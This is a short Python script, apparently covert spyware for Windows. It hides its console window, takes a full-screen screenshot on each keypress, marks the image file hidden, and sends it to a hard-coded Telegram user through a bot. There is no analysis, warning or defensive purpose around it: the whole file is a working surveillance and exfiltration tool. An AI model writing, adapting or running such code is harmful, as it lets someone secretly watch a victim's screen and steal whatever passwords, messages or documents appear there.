import telebot
import subprocess
import pyscreenshot as ImageGrab
import win32gui, win32con
import os
import msvcrt   

tb = telebot.TeleBot('token') # token 

# hide console 
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)

# func     
def secret_screenshot():
    if os.path.exists('fullscreen.png'):
        os.remove('fullscreen.png')
    im = ImageGrab.grab()
    im.save("fullscreen.png")
    subprocess.check_call(["attrib", "+H", "fullscreen.png"])


if __name__ == '__main__':
    while True:
        if msvcrt.kbhit():
            key = msvcrt.getch()
            secret_screenshot()
            tb.send_photo(770562006, open('./fullscreen.png', 'rb')) #7705.. - user_id